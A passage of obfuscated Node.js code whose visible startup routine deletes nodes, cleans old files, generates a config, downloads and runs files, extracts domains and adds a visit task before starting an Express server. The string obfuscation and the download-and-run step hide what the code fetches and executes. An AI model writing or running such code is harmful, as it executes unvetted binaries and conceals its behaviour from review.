x20running'];_0x42f7=function(){return _0x4929d9;};return _0x42f7();}async function startserver(){const _0x7430a4=_0x23226a;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4c5e02){console['error'](_0x7430a4(0x184),_0x4c5e02);}}startserver()[_0x23226a(0x16a)](_0x22e7a2=>{const _0x4fd4b3=_0x23226a;console[_0x4fd4b3(0x17e)](_0x4fd4b3(0x1b2),_0x22e7a2);}),app[_0x23226a(0x177)](PORT,()=>console[_0x23226a(0x178)](_0x23226a(0x159)+PORT+'!'));
